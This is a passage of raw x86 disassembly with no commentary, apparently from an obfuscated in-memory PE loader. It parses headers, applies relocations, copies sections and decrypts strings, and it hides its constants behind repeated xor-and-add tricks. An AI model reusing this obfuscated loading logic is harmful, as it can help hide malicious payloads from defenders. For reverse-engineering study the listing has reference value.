  413886:	sub    edi,DWORD PTR [ebp+0x8]
  413889:	mov    DWORD PTR [esi],edi
  41388b:	mov    esi,DWORD PTR [ebp-0x10]
  41388e:	test   esi,esi
  413890:	je     0x4138a0
  413892:	mov    ebx,DWORD PTR [ebp-0x8]
  413895:	inc    ebx
  413896:	mov    DWORD PTR [ebp-0x8],ebx
  413899:	cmp    ebx,DWORD PTR [ebp-0x4]
  41389c:	jb     0x413856
  41389e:	jmp    0x413827
  4138a0:	xor    eax,eax
  4138a2:	pop    edi
  4138a3:	pop    esi
  4138a4:	pop    ebx
  4138a5:	leave  
  4138a6:	ret    0x8
  4138a9:	push   ebp
  4138aa:	mov    ebp,esp
  4138ac:	sub    esp,0x2c
  4138af:	mov    edx,0xf89c85b5
  4138b4:	mov    DWORD PTR [ebp-0x4],edx
  4138b7:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4138be:	mov    eax,DWORD PTR [ebp-0x4]
  4138c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4138ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4138cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4138d0:	push   ebx
  4138d1:	mov    ebx,DWORD PTR [ebp+0x10]
  4138d4:	push   esi
  4138d5:	mov    esi,0x7510896
  4138da:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4138e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138e4:	mov    ebx,DWORD PTR [ebx+0x190]
  4138ea:	push   edi
  4138eb:	mov    edi,0x3272dd
  4138f0:	xor    ecx,esi
  4138f2:	xor    eax,esi
  4138f4:	add    eax,edi
  4138f6:	add    ecx,edi
  4138f8:	mov    DWORD PTR [ebp-0x18],eax
  4138fb:	cmp    ecx,DWORD PTR [ebx]
  4138fd:	je     0x413b7e
  413903:	mov    ebx,DWORD PTR [ebp-0x4]
  413906:	mov    ecx,DWORD PTR [ebp+0xc]
  413909:	xor    ebx,esi
  41390b:	add    ebx,edi
  41390d:	cmp    ebx,ecx
  41390f:	je     0x413b7e
  413915:	mov    ebx,DWORD PTR [ebp-0x4]
  413918:	mov    ecx,DWORD PTR [ecx+0x80]
  41391e:	xor    ebx,esi
  413920:	add    ebx,edi
  413922:	cmp    ecx,ebx
  413924:	je     0x413b79
  41392a:	add    ecx,DWORD PTR [ebp+0x8]
  41392d:	mov    DWORD PTR [ebp-0x2c],ecx
  413930:	mov    ebx,edx
  413932:	xor    ebx,esi
  413934:	add    ebx,edi
  413936:	mov    DWORD PTR [ebp-0x10],ebx
  413939:	mov    ebx,DWORD PTR [ebp-0x10]
  41393c:	cmp    ebx,edx
  41393e:	je     0x413952
  413940:	mov    edx,DWORD PTR [ebp-0x10]
  413943:	mov    ebx,DWORD PTR [ebp-0x4]
  413946:	imul   edx,edx,0x14
  413949:	xor    ebx,esi
  41394b:	add    ebx,edi
  41394d:	cmp    DWORD PTR [edx+ecx*1],ebx
  413950:	jne    0x413969
  413952:	mov    edx,DWORD PTR [ebp-0x10]
  413955:	mov    ebx,DWORD PTR [ebp-0x4]
  413958:	imul   edx,edx,0x14
  41395b:	xor    ebx,esi
  41395d:	add    ebx,edi
  41395f:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  413963:	je     0x413b6b
  413969:	mov    eax,DWORD PTR [ebp-0x4]
  41396c:	mov    ebx,DWORD PTR [ebp-0x4]
  41396f:	mov    eax,DWORD PTR [ebp-0x10]
  413972:	imul   eax,eax,0x14
  413975:	add    eax,ecx
  413977:	mov    ecx,DWORD PTR [eax+0x10]
  41397a:	add    ecx,DWORD PTR [ebp+0x8]
  41397d:	xor    ebx,esi
  41397f:	mov    DWORD PTR [ebp-0x1c],ecx
  413982:	mov    ecx,DWORD PTR [ebp-0x4]
  413985:	mov    edx,DWORD PTR [ebp-0x4]
  413988:	xor    ecx,esi
  41398a:	add    ecx,edi
  41398c:	xor    edx,esi
  41398e:	mov    DWORD PTR [ebp-0x24],ecx
  413991:	mov    ecx,DWORD PTR [eax]
  413993:	add    edx,edi
  413995:	add    ebx,edi
  413997:	cmp    ecx,edx
  413999:	je     0x4139a1
  41399b:	add    ecx,DWORD PTR [ebp+0x8]
  41399e:	mov    DWORD PTR [ebp-0x24],ecx
  4139a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4139a4:	xor    ecx,esi
  4139a6:	add    ecx,DWORD PTR [eax+0xc]
  4139a9:	mov    eax,DWORD PTR [ebp+0x8]
  4139ac:	lea    eax,[ecx+eax*1+0x3272dd]
  4139b3:	mov    DWORD PTR [ebp+0xc],eax
  4139b6:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4139bd:	mov    eax,DWORD PTR [ebp+0x10]
  4139c0:	push   DWORD PTR [ebp+0xc]
  4139c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4139c9:	call   DWORD PTR [eax]
  4139cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4139ce:	xor    ecx,esi
  4139d0:	add    ecx,edi
  4139d2:	mov    DWORD PTR [ebp-0xc],eax
  4139d5:	cmp    ecx,eax
  4139d7:	jne    0x4139eb
  4139d9:	mov    eax,DWORD PTR [ebp+0x10]
  4139dc:	push   DWORD PTR [ebp+0xc]
  4139df:	mov    eax,DWORD PTR [eax+0x1d8]
  4139e5:	call   DWORD PTR [eax+0xc]
  4139e8:	mov    DWORD PTR [ebp-0xc],eax
  4139eb:	mov    DWORD PTR [ebp-0x20],0x7f661b0a
  4139f2:	mov    DWORD PTR [ebp-0x20],0xf89c999a
  4139f9:	mov    eax,DWORD PTR [ebp-0x4]
  4139fc:	xor    eax,esi
  4139fe:	add    eax,edi
  413a00:	cmp    eax,DWORD PTR [ebp-0xc]
  413a03:	jne    0x413a28
  413a05:	mov    eax,DWORD PTR [ebp-0x8]
  413a08:	mov    ecx,DWORD PTR [ebp-0x20]
  413a0b:	xor    eax,esi
  413a0d:	xor    ecx,esi
  413a0f:	lea    ebx,[ebx+eax*1+0x3272dd]
  413a16:	mov    eax,DWORD PTR [ebp+0x10]
  413a19:	mov    eax,DWORD PTR [eax+0x1d8]
  413a1f:	add    ecx,edi
  413a21:	imul   ecx,ebx
  413a24:	push   ecx
  413a25:	call   DWORD PTR [eax+0x24]
  413a28:	mov    eax,DWORD PTR [ebp-0x4]
  413a2b:	xor    eax,esi
  413a2d:	add    eax,edi
  413a2f:	cmp    eax,DWORD PTR [ebp-0xc]
  413a32:	jne    0x413a43
  413a34:	mov    eax,DWORD PTR [ebp-0x28]
  413a37:	xor    eax,esi
  413a39:	add    eax,edi
  413a3b:	cmp    ebx,eax
  413a3d:	jbe    0x4139bd
  413a43:	mov    eax,DWORD PTR [ebp-0x4]
  413a46:	xor    eax,esi
  413a48:	add    eax,edi
  413a4a:	cmp    eax,DWORD PTR [ebp-0xc]
  413a4d:	jne    0x413a66
  413a4f:	mov    eax,DWORD PTR [ebp-0x8]
  413a52:	mov    ecx,DWORD PTR [ebp-0x18]
  413a55:	xor    eax,esi
  413a57:	lea    eax,[ecx+eax*1+0x3272dd]
  413a5e:	mov    DWORD PTR [ebp-0x18],eax
  413a61:	jmp    0x413b55
  413a66:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  413a6d:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  413a74:	mov    ebx,DWORD PTR [ebp-0x4]
  413a77:	xor    ebx,esi
  413a79:	add    ebx,edi
  413a7b:	jmp    0x413b42
  413a80:	mov    eax,DWORD PTR [ebp-0x4]
  413a83:	xor    eax,esi
  413a85:	add    eax,edi
  413a87:	mov    DWORD PTR [ebp-0x14],eax
  413a8a:	mov    eax,DWORD PTR [ebp-0x4]
  413a8d:	xor    eax,esi
  413a8f:	add    eax,edi
  413a91:	mov    DWORD PTR [ebp+0xc],eax
  413a94:	mov    ecx,DWORD PTR [ebp-0x4]
  413a97:	mov    eax,DWORD PTR [ebp-0x24]
  413a9a:	xor    ecx,esi
  413a9c:	add    ecx,edi
  413a9e:	cmp    ecx,eax
  413aa0:	je     0x413aa8
  413aa2:	mov    eax,DWORD PTR [eax+ebx*4]
  413aa5:	mov    DWORD PTR [ebp-0x14],eax
  413aa8:	mov    eax,DWORD PTR [ebp-0x1c]
  413aab:	mov    eax,DWORD PTR [eax+ebx*4]
  413aae:	mov    DWORD PTR [ebp+0xc],eax
  413ab1:	mov    eax,DWORD PTR [ebp-0x4]
  413ab4:	mov    ecx,DWORD PTR [ebp-0x14]
  413ab7:	xor    eax,esi
  413ab9:	add    eax,edi
  413abb:	cmp    eax,ecx
  413abd:	je     0x413ae8
  413abf:	mov    eax,DWORD PTR [ebp-0x4]
  413ac2:	mov    ecx,DWORD PTR [ebp-0x14]
  413ac5:	xor    eax,esi
  413ac7:	add    eax,edi
  413ac9:	shr    ecx,0x1f
  413acc:	cmp    eax,ecx
  413ace:	je     0x413ae8
  413ad0:	mov    ecx,DWORD PTR [ebp-0x14]
  413ad3:	mov    eax,DWORD PTR [ebp+0x10]
  413ad6:	mov    eax,DWORD PTR [eax+0x1d8]
  413adc:	movzx  ecx,cx
  413adf:	push   ecx
  413ae0:	push   DWORD PTR [ebp-0xc]
  413ae3:	call   DWORD PTR [eax+0x8]
  413ae6:	jmp    0x413b01
  413ae8:	mov    eax,DWORD PTR [ebp+0xc]
  413aeb:	add    eax,DWORD PTR [ebp+0x8]
  413aee:	mov    ecx,DWORD PTR [ebp+0x10]
  413af1:	mov    ecx,DWORD PTR [ecx+0x1d8]
  413af7:	add    eax,0x2
  413afa:	push   eax
  413afb:	push   DWORD PTR [ebp-0xc]
  413afe:	call   DWORD PTR [ecx+0x8]
  413b01:	mov    DWORD PTR [ebp+0xc],eax
  413b04:	mov    eax,DWORD PTR [ebp-0x4]
  413b07:	mov    ecx,DWORD PTR [ebp+0xc]
  413b0a:	xor    eax,esi
  413b0c:	add    eax,edi
  413b0e:	cmp    eax,ecx
  413b10:	mov    eax,DWORD PTR [ebp-0x8]
  413b13:	jne    0x413b26
  413b15:	mov    ecx,DWORD PTR [ebp-0x18]
  413b18:	xor    eax,esi
  413b1a:	lea    eax,[ecx+eax*1+0x3272dd]
  413b21:	mov    DWORD PTR [ebp-0x18],eax
  413b24:	jmp    0x413b36
  413b26:	mov    ecx,DWORD PTR [ebp+0xc]
  413b29:	xor    eax,esi
  413b2b:	add    eax,edi
  413b2d:	imul   eax,ecx
  413b30:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b33:	mov    DWORD PTR [ecx+ebx*4],eax
  413b36:	mov    eax,DWORD PTR [ebp-0x8]
  413b39:	xor    eax,esi
  413b3b:	lea    ebx,[ebx+eax*1+0x3272dd]
  413b42:	mov    eax,DWORD PTR [ebp-0x4]
  413b45:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b48:	xor    eax,esi
  413b4a:	add    eax,edi
  413b4c:	cmp    DWORD PTR [ecx+ebx*4],eax
  413b4f:	jne    0x413a80
  413b55:	mov    edx,DWORD PTR [ebp-0x10]
  413b58:	mov    eax,DWORD PTR [ebp-0x18]
  413b5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  413b5e:	sub    edx,0x3272dc
  413b64:	xor    edx,esi
  413b66:	jmp    0x413930
  413b6b:	mov    ecx,DWORD PTR [ebp-0x4]
  413b6e:	xor    ecx,esi
  413b70:	add    ecx,edi
  413b72:	cmp    eax,ecx
  413b74:	mov    eax,DWORD PTR [ebp-0x4]
  413b77:	jne    0x413b81
  413b79:	mov    eax,DWORD PTR [ebp-0x8]
  413b7c:	jmp    0x413b81
  413b7e:	mov    eax,DWORD PTR [ebp-0x4]
  413b81:	xor    eax,esi
  413b83:	add    eax,edi
  413b85:	pop    edi
  413b86:	pop    esi
  413b87:	pop    ebx
  413b88:	leave  
  413b89:	ret    0xc
  413b8c:	push   ebp
  413b8d:	mov    ebp,esp
  413b8f:	sub    esp,0x28
  413b92:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413b99:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  413ba0:	mov    eax,DWORD PTR [ebp+0xc]
  413ba3:	mov    DWORD PTR [ebp+0xc],eax
  413ba6:	push   esi
  413ba7:	mov    eax,eax
  413ba9:	mov    eax,DWORD PTR [ebp-0x4]
  413bac:	mov    esi,DWORD PTR [ebp+0x8]
  413baf:	mov    ecx,0x7510896
  413bb4:	xor    eax,ecx
  413bb6:	mov    edx,0x3272dd
  413bbb:	add    eax,edx
  413bbd:	cmp    esi,eax
  413bbf:	je     0x413ce6
  413bc5:	mov    eax,DWORD PTR [ebp+0x8]
  413bc8:	mov    esi,DWORD PTR [ebp+0x8]
  413bcb:	add    esi,DWORD PTR [eax+0x3c]
  413bce:	push   edi
  413bcf:	mov    DWORD PTR [ebp+0xc],esi
  413bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  413bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  413bdc:	mov    esi,DWORD PTR [ebp-0x4]
  413bdf:	mov    edi,DWORD PTR [ebp+0xc]
  413be2:	xor    esi,ecx
  413be4:	xor    eax,ecx
  413be6:	add    esi,edx
  413be8:	cmp    DWORD PTR [edi+eax*8+0x1939760],esi
  413bef:	je     0x413ce0
  413bf5:	mov    esi,DWORD PTR [ebp+0xc]
  413bf8:	mov    eax,DWORD PTR [ebp+0x8]
  413bfb:	add    eax,DWORD PTR [esi+0xa0]
  413c01:	mov    esi,DWORD PTR [ebp+0x8]
  413c04:	mov    edi,DWORD PTR [ebp+0xc]
  413c07:	sub    esi,DWORD PTR [edi+0x34]
  413c0a:	mov    edi,DWORD PTR [ebp-0x4]
  413c0d:	xor    edi,ecx
  413c0f:	add    edi,edx
  413c11:	mov    DWORD PTR [ebp-0x24],esi
  413c14:	cmp    esi,edi
  413c16:	je     0x413ce0
  413c1c:	mov    esi,DWORD PTR [ebp-0x4]
  413c1f:	xor    esi,ecx
  413c21:	add    esi,edx
  413c23:	mov    DWORD PTR [ebp-0x8],esi
  413c26:	push   ebx
  413c27:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  413c2e:	jmp    0x413cca
  413c33:	mov    esi,DWORD PTR [ebp-0x4]
  413c36:	xor    esi,ecx
  413c38:	lea    edi,[ebx-0x8]
  413c3b:	add    esi,edx
  413c3d:	shr    edi,1
  413c3f:	cmp    esi,edi
  413c41:	jae    0x413cb0
  413c43:	sub    edi,esi
  413c45:	lea    ebx,[eax+esi*2+0x8]
  413c49:	mov    DWORD PTR [ebp-0x18],edi
  413c4c:	movzx  esi,WORD PTR [ebx]
  413c4f:	and    esi,0xfff
  413c55:	mov    DWORD PTR [ebp-0x14],esi
  413c58:	mov    edi,DWORD PTR [ebp-0x14]
  413c5b:	mov    esi,DWORD PTR [eax]
  413c5d:	sub    esi,edx
  413c5f:	add    edi,esi
  413c61:	movzx  esi,WORD PTR [ebx]
  413c64:	shr    esi,0xc
  413c67:	xor    edi,ecx
  413c69:	mov    DWORD PTR [ebp-0x20],edi
  413c6c:	mov    DWORD PTR [ebp-0x14],esi
  413c6f:	mov    esi,DWORD PTR [ebp-0x20]
  413c72:	mov    edi,DWORD PTR [ebp+0x8]
  413c75:	xor    esi,ecx
  413c77:	lea    esi,[esi+edi*1+0x3272dd]
  413c7e:	mov    DWORD PTR [ebp-0x20],esi
  413c81:	mov    esi,DWORD PTR [ebp-0x10]
  413c84:	mov    edi,DWORD PTR [ebp-0x14]
  413c87:	xor    esi,ecx
  413c89:	add    esi,edx
  413c8b:	cmp    edi,esi
  413c8d:	jne    0x413ca5
  413c8f:	mov    esi,DWORD PTR [ebp-0x10]
  413c92:	mov    edi,DWORD PTR [ebp-0x14]
  413c95:	xor    esi,ecx
  413c97:	add    esi,edx
  413c99:	cmp    edi,esi
  413c9b:	jne    0x413ca5
  413c9d:	mov    esi,DWORD PTR [ebp-0x20]
  413ca0:	mov    edi,DWORD PTR [ebp-0x24]
  413ca3:	add    DWORD PTR [esi],edi
  413ca5:	add    ebx,0x2
  413ca8:	dec    DWORD PTR [ebp-0x18]
  413cab:	jne    0x413c4c
  413cad:	mov    ebx,DWORD PTR [ebp-0xc]
  413cb0:	add    DWORD PTR [ebp-0x8],ebx
  413cb3:	mov    esi,DWORD PTR [ebp-0x1c]
  413cb6:	mov    edi,DWORD PTR [ebp-0x8]
  413cb9:	mov    ebx,DWORD PTR [ebp+0xc]
  413cbc:	xor    esi,ecx
  413cbe:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939764]
  413cc5:	jae    0x413cdf
  413cc7:	add    eax,DWORD PTR [ebp-0xc]
  413cca:	mov    esi,DWORD PTR [ebp-0x4]
  413ccd:	mov    ebx,DWORD PTR [eax+0x4]
  413cd0:	xor    esi,ecx
  413cd2:	add    esi,edx
  413cd4:	mov    DWORD PTR [ebp-0xc],ebx
  413cd7:	cmp    ebx,esi
  413cd9:	jne    0x413c33
  413cdf:	pop    ebx
  413ce0:	mov    eax,DWORD PTR [ebp-0x28]
  413ce3:	pop    edi
  413ce4:	jmp    0x413ce9
  413ce6:	mov    eax,DWORD PTR [ebp-0x4]
  413ce9:	xor    eax,ecx
  413ceb:	add    eax,edx
  413ced:	pop    esi
  413cee:	leave  
  413cef:	ret    0x8
  413cf2:	push   ebp
  413cf3:	mov    ebp,esp
  413cf5:	sub    esp,0x54
  413cf8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413cff:	mov    DWORD PTR [ebp-0x24],0xf89c85b2
  413d06:	mov    eax,DWORD PTR [ebp-0x4]
  413d09:	push   ebx
  413d0a:	push   esi
  413d0b:	mov    esi,0x7510896
  413d10:	xor    eax,esi
  413d12:	mov    ebx,0x3272dd
  413d17:	add    eax,ebx
  413d19:	mov    DWORD PTR [ebp-0x18],eax
  413d1c:	mov    eax,DWORD PTR [ebp-0x4]
  413d1f:	xor    eax,esi
  413d21:	add    eax,ebx
  413d23:	mov    DWORD PTR [ebp-0x20],eax
  413d26:	push   edi
  413d27:	mov    edi,DWORD PTR [ebp+0x20]
  413d2a:	mov    eax,DWORD PTR [ebp-0x10]
  413d2d:	mov    ecx,DWORD PTR [ebp-0x10]
  413d30:	xor    eax,ecx
  413d32:	mov    DWORD PTR [ebp-0x10],eax
  413d35:	add    DWORD PTR [ebp-0x10],0xf89cb5b5
  413d3c:	mov    eax,DWORD PTR [ebp-0x8]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  413d42:	xor    eax,ecx
  413d44:	mov    DWORD PTR [ebp-0x8],eax
  413d47:	add    DWORD PTR [ebp-0x8],0xf89c85f5
  413d4e:	mov    eax,DWORD PTR [ebp-0xc]
  413d51:	mov    ecx,DWORD PTR [ebp-0xc]
  413d54:	xor    eax,ecx
  413d56:	mov    DWORD PTR [ebp-0xc],eax
  413d59:	add    DWORD PTR [ebp-0xc],0xf89c85b1
  413d60:	mov    eax,DWORD PTR [ebp-0x14]
  413d63:	mov    ecx,DWORD PTR [ebp-0x14]
  413d66:	xor    eax,ecx
  413d68:	mov    DWORD PTR [ebp-0x14],eax
  413d6b:	add    DWORD PTR [ebp-0x14],0xf89f05b5
  413d72:	mov    eax,0x9588
  413d77:	mov    WORD PTR [ebp+0x20],ax
  413d7b:	mov    eax,DWORD PTR [ebp+0x8]
  413d7e:	test   eax,eax
  413d80:	je     0x414165
  413d86:	mov    eax,DWORD PTR [ebp+0xc]
  413d89:	test   eax,eax
  413d8b:	je     0x414165
  413d91:	mov    eax,DWORD PTR [ebp+0x18]
  413d94:	test   eax,eax
  413d96:	je     0x414165
  413d9c:	mov    ax,WORD PTR [ebp+0x20]
  413da0:	mov    ecx,0x8a89
  413da5:	xor    ax,cx
  413da8:	mov    ecx,0x3b4c
  413dad:	add    ax,cx
  413db0:	mov    ecx,DWORD PTR [ebp+0x8]
  413db3:	cmp    WORD PTR [ecx],ax
  413db6:	jne    0x414165
  413dbc:	mov    eax,DWORD PTR [ebp-0x4]
  413dbf:	mov    ecx,DWORD PTR [ebp+0x8]
  413dc2:	mov    eax,DWORD PTR [ebp+0x8]
  413dc5:	add    eax,DWORD PTR [ecx+0x3c]
  413dc8:	mov    DWORD PTR [ebp+0xc],eax
  413dcb:	mov    eax,DWORD PTR [eax+0x50]
  413dce:	test   eax,eax
  413dd0:	je     0x414165
  413dd6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  413ddd:	mov    eax,DWORD PTR [ebp-0x2c]
  413de0:	xor    eax,esi
  413de2:	add    eax,ebx
  413de4:	mov    DWORD PTR [ebp-0x2c],eax
  413de7:	mov    eax,DWORD PTR [ebp-0x4]
  413dea:	mov    eax,DWORD PTR [edi+0x190]
  413df0:	mov    ecx,DWORD PTR [eax]
  413df2:	mov    ecx,DWORD PTR [ecx+0x3c]
  413df5:	add    ecx,DWORD PTR [eax]
  413df7:	mov    eax,DWORD PTR [ebp-0x4]
  413dfa:	mov    eax,DWORD PTR [edi+0x18c]
  413e00:	mov    edx,DWORD PTR [eax]
  413e02:	mov    DWORD PTR [ebp-0x1c],ecx
  413e05:	mov    DWORD PTR [ebp+0x20],edx
  413e08:	cmp    edx,edx
  413e0a:	jne    0x413e3f
  413e0c:	mov    eax,DWORD PTR [edi+0x1d8]
  413e12:	lea    edx,[ebp-0x18]
  413e15:	push   edx
  413e16:	mov    edx,DWORD PTR [ebp-0x8]
  413e19:	xor    edx,esi
  413e1b:	add    edx,ebx
  413e1d:	push   edx
  413e1e:	push   DWORD PTR [ecx+0x50]
  413e21:	push   DWORD PTR [ebp+0x20]
  413e24:	call   DWORD PTR [eax+0x1c]
  413e27:	mov    ecx,DWORD PTR [ebp-0x1c]
  413e2a:	mov    eax,DWORD PTR [ecx+0x54]
  413e2d:	mov    ecx,DWORD PTR [ecx+0x50]
  413e30:	sub    ecx,eax
  413e32:	add    eax,DWORD PTR [ebp+0x20]
  413e35:	push   ecx
  413e36:	push   eax
  413e37:	call   0x414779
  413e3c:	mov    edx,DWORD PTR [ebp+0x20]
  413e3f:	mov    eax,DWORD PTR [edi+0x194]
  413e45:	mov    DWORD PTR [eax],edx
  413e47:	mov    eax,DWORD PTR [ebp+0xc]
  413e4a:	push   DWORD PTR [eax+0x54]
  413e4d:	push   DWORD PTR [ebp+0x8]
  413e50:	push   edx
  413e51:	call   0x414620
  413e56:	mov    ecx,DWORD PTR [ebp+0x20]
  413e59:	mov    eax,DWORD PTR [ecx+0x3c]
  413e5c:	add    eax,ecx
  413e5e:	movzx  ecx,WORD PTR [eax+0x14]
  413e62:	lea    ecx,[ecx+eax*1+0x18]
  413e66:	mov    DWORD PTR [ebp+0x18],ecx
  413e69:	mov    ecx,DWORD PTR [ebp-0x4]
  413e6c:	movzx  edx,WORD PTR [eax+0x6]
  413e70:	xor    ecx,esi
  413e72:	add    ecx,ebx
  413e74:	mov    DWORD PTR [ebp+0xc],eax
  413e77:	cmp    edx,ecx
  413e79:	je     0x413f27
  413e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  413e82:	xor    ecx,esi
  413e84:	add    ecx,ebx
  413e86:	mov    DWORD PTR [ebp-0x20],ecx
  413e89:	mov    ecx,DWORD PTR [ebp-0x24]
  413e8c:	movzx  edx,WORD PTR [eax+0x6]
  413e90:	xor    ecx,esi
  413e92:	sub    edx,ecx
  413e94:	sub    edx,ebx
  413e96:	cmp    DWORD PTR [ebp-0x20],edx
  413e99:	ja     0x413f27
  413e9f:	mov    edx,DWORD PTR [ebp+0x18]
  413ea2:	add    edx,0x8
  413ea5:	mov    DWORD PTR [ebp+0x18],edx
  413ea8:	jmp    0x413ead
  413eaa:	mov    edx,DWORD PTR [ebp+0x18]
  413ead:	mov    eax,DWORD PTR [eax+0x38]
  413eb0:	lea    ecx,[eax-0x1]
  413eb3:	mov    DWORD PTR [ebp-0x30],eax
  413eb6:	mov    eax,DWORD PTR [edx]
  413eb8:	test   ecx,eax
  413eba:	je     0x413ec3
  413ebc:	not    ecx
  413ebe:	and    eax,ecx
  413ec0:	add    eax,DWORD PTR [ebp-0x30]
  413ec3:	push   eax
  413ec4:	mov    eax,DWORD PTR [edx+0x4]
  413ec7:	add    eax,DWORD PTR [ebp+0x20]
  413eca:	push   eax
  413ecb:	call   0x414779
  413ed0:	mov    edx,DWORD PTR [ebp-0x4]
  413ed3:	mov    eax,DWORD PTR [ebp+0x18]
  413ed6:	mov    ecx,DWORD PTR [eax+0x8]
  413ed9:	xor    edx,esi
  413edb:	add    edx,ebx
  413edd:	cmp    ecx,edx
  413edf:	je     0x413ef8
  413ee1:	push   ecx
  413ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  413ee5:	add    ecx,DWORD PTR [eax+0xc]
  413ee8:	mov    eax,DWORD PTR [eax+0x4]
  413eeb:	add    eax,DWORD PTR [ebp+0x20]
  413eee:	push   ecx
  413eef:	push   eax
  413ef0:	call   0x414620
  413ef5:	mov    eax,DWORD PTR [ebp+0x18]
  413ef8:	mov    ecx,DWORD PTR [ebp-0x24]
  413efb:	mov    edx,DWORD PTR [ebp-0x20]
  413efe:	add    eax,0x28
  413f01:	xor    ecx,esi
  413f03:	lea    ecx,[edx+ecx*1+0x3272dd]
  413f0a:	mov    edx,DWORD PTR [ebp+0xc]
  413f0d:	mov    DWORD PTR [ebp+0x18],eax
  413f10:	mov    eax,DWORD PTR [ebp-0x24]
  413f13:	movzx  edx,WORD PTR [edx+0x6]
  413f17:	xor    eax,esi
  413f19:	sub    edx,eax
  413f1b:	mov    eax,DWORD PTR [ebp+0xc]
  413f1e:	sub    edx,ebx
  413f20:	mov    DWORD PTR [ebp-0x20],ecx
  413f23:	cmp    ecx,edx
  413f25:	jbe    0x413eaa
  413f27:	mov    ecx,DWORD PTR [ebp-0x4]
  413f2a:	mov    edx,DWORD PTR [edi+0x18c]
  413f30:	xor    ecx,esi
  413f32:	add    ecx,ebx
  413f34:	mov    DWORD PTR [ebp+0x18],ecx
  413f37:	mov    ecx,DWORD PTR [ebp+0x20]
  413f3a:	cmp    ecx,DWORD PTR [edx]
  413f3c:	jne    0x413f65
  413f3e:	mov    eax,DWORD PTR [edi+0x1d8]
  413f44:	lea    edx,[ebp-0x18]
  413f47:	push   edx
  413f48:	mov    edx,DWORD PTR [ebp-0xc]
  413f4b:	xor    edx,esi
  413f4d:	add    edx,ebx
  413f4f:	push   edx
  413f50:	mov    edx,DWORD PTR [ebp-0x1c]
  413f53:	push   DWORD PTR [edx+0x54]
  413f56:	push   ecx
  413f57:	call   DWORD PTR [eax+0x1c]
  413f5a:	test   eax,eax
  413f5c:	je     0x414156
  413f62:	mov    eax,DWORD PTR [ebp+0xc]
  413f65:	mov    ecx,DWORD PTR [edi+0x1c8]
  413f6b:	mov    ecx,DWORD PTR [ecx]
  413f6d:	xor    ecx,esi
  413f6f:	add    ecx,ebx
  413f71:	je     0x414081
  413f77:	and    DWORD PTR [ebp-0x28],0x0
  413f7b:	mov    eax,0x4fab
  413f80:	mov    WORD PTR [ebp-0x3c],ax
  413f84:	add    eax,0xfffffff6
  413f87:	mov    WORD PTR [ebp-0x3a],ax
  413f8b:	mov    eax,0x4f91
  413f90:	mov    WORD PTR [ebp-0x38],ax
  413f94:	add    eax,0x18
  413f97:	and    DWORD PTR [ebp+0x8],0x0
  413f9b:	mov    ecx,eax
  413f9d:	mov    WORD PTR [ebp-0x34],ax
  413fa1:	mov    eax,0x4e3d
  413fa6:	mov    WORD PTR [ebp-0x36],cx
  413faa:	mov    WORD PTR [ebp-0x32],ax
  413fae:	mov    eax,DWORD PTR [ebp+0x8]
  413fb1:	lea    eax,[ebp+eax*2-0x3c]
  413fb5:	mov    ecx,0x8a89
  413fba:	xor    cx,WORD PTR [eax]
  413fbd:	mov    edx,0x3b4c
  413fc2:	add    cx,dx
  413fc5:	inc    DWORD PTR [ebp+0x8]
  413fc8:	cmp    DWORD PTR [ebp+0x8],0x6
  413fcc:	mov    WORD PTR [eax],cx
  413fcf:	jb     0x413fae
  413fd1:	mov    DWORD PTR [ebp-0x54],0x200c1e26
  413fd8:	mov    DWORD PTR [ebp-0x50],0x211e0805
  413fdf:	mov    DWORD PTR [ebp-0x4c],0xf50c0e08
  413fe6:	mov    DWORD PTR [ebp-0x48],0x3d0c0b20
  413fed:	mov    DWORD PTR [ebp-0x44],0x10c1e1e
  413ff4:	mov    WORD PTR [ebp-0x40],0xf0f
  413ffa:	mov    BYTE PTR [ebp-0x3e],0x7a
  413ffe:	xor    ecx,ecx
  414000:	lea    eax,[ebp+ecx*1-0x54]
  414004:	mov    dl,BYTE PTR [eax]
  414006:	xor    dl,0x71
  414009:	sub    dl,0xb
  41400c:	inc    ecx
  41400d:	mov    BYTE PTR [eax],dl
  41400f:	cmp    ecx,0x17
  414012:	jb     0x414000
  414014:	mov    eax,DWORD PTR [edi+0x1d8]
  41401a:	lea    ecx,[ebp-0x3c]
  41401d:	push   ecx
  41401e:	call   DWORD PTR [eax+0x4]
  414021:	mov    ecx,DWORD PTR [edi+0x1d8]
  414027:	lea    edx,[ebp-0x54]
  41402a:	push   edx
  41402b:	push   eax
  41402c:	call   DWORD PTR [ecx+0x8]
  41402f:	lea    ecx,[ebp-0x28]
  414032:	push   ecx
  414033:	mov    ecx,DWORD PTR [edi+0x18c]
  414039:	push   DWORD PTR [ecx]
  41403b:	call   eax
  41403d:	mov    eax,DWORD PTR [ebp-0x28]
  414040:	test   eax,eax
  414042:	je     0x41407e
  414044:	mov    DWORD PTR [ebp+0x8],eax
  414047:	jmp    0x414053
  414049:	mov    eax,DWORD PTR [eax]
  41404b:	mov    DWORD PTR [ebp-0x28],eax
  41404e:	cmp    eax,DWORD PTR [ebp+0x8]
  414051:	je     0x414060
  414053:	mov    edx,DWORD PTR [eax+0x18]
